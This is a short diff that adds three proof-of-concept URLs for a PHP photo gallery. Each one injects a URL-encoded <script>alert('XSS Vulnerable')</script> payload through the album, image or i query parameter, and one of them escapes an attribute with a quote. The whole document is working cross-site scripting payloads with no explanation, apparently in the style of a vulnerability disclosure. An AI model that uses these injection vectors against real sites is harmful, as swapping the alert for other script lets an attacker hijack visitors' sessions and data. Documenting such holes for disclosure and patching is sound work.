@@ -1,0 +1,3 @@
+http://www.example.com/photos/zen/i.php?a=%3Cscript%3Ealert(&#039;XSS%20Vulnerable&#039;)%3B%3C/script%3E&amp;i=1%2Ejpg&amp;s=thumb
+http://www.example.com/photos/index.php?album=%3Cscript%3Ealert(&#039;XSS%20Vulnerable&#039;)%3B%3C/script%3E
+http://www.example.com/photos/index.php?album=EXISTING_ALBUM_NAME&amp;image=&#039;%3E%3Cscript%3Ealert(&#039;XSS%20Vulnerable&#039;)%3B%3C/script%3E
